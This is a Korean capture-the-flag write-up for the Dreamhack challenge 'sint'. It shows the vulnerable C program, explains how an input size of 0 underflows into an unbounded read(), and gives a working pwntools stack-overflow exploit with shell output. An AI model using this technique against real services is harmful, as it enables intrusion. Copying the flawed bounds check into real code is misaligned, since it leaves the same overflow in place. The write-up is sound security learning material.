## 개요

- 분야: Pwnable
- 주제: Integer Underflow + Stack Buffer Overflow
- 환경: Linux

## 분석


----------------------------------------------------------------------------------------

## sint의 C코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();

    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```
이 코드를 보면 SIGSEGV. 세그먼트 에러를 내면 get_shell이 나온다는것을 알수있다. 또 size > 256 || size < 0 이 구문과 read(0, buf, size - 1); 으로 인해 size=0이면 size - 1 = -1이 되고, read()의 세 번째 인자는 바이트 수를 나타내는 unsigned 계열 타입이라 매우 큰 값으로 해석될 수 있다

----------------------------------------------------------------------------------------

## Exploit

```Py
from pwn import *

r = remote("host3.dreamhack.games", 16974)
elf = ELF('./sint')
get_shell = elf.symbols["get_shell"]

r.sendline(b'0')
r.sendline(b'A' * (0x100 + 0x4) + p32(get_shell))

r.interactive()
```

연결후 sint를 ELF로 elf변수에 저장, get_shell변수에 get_shell의 주소 저장. size = 0을 보낸뒤
A를 바이트로 A * 256 + 4 + get_shell의 주소를 32바이트로 패킹하여 보냄. 이후 직접 입력모드로 전환.

----------------------------------------------------------------------------------------

## 결과
```console
jjang@wjw:/mnt/c/Users/jjang/Downloads/73113828-8514-40bc-81fe-bdabf107e126$ python3 s.py
[+] Opening connection to host3.dreamhack.games on port 16974: Done
[*] '/mnt/c/Users/jjang/Downloads/73113828-8514-40bc-81fe-bdabf107e126/sint'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[*] Switching to interactive mode
Size: Data: $ ls
flag
sint
$ cat flag
DH{□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□}$
```
플레그가 정상적으로 출력 되었다.
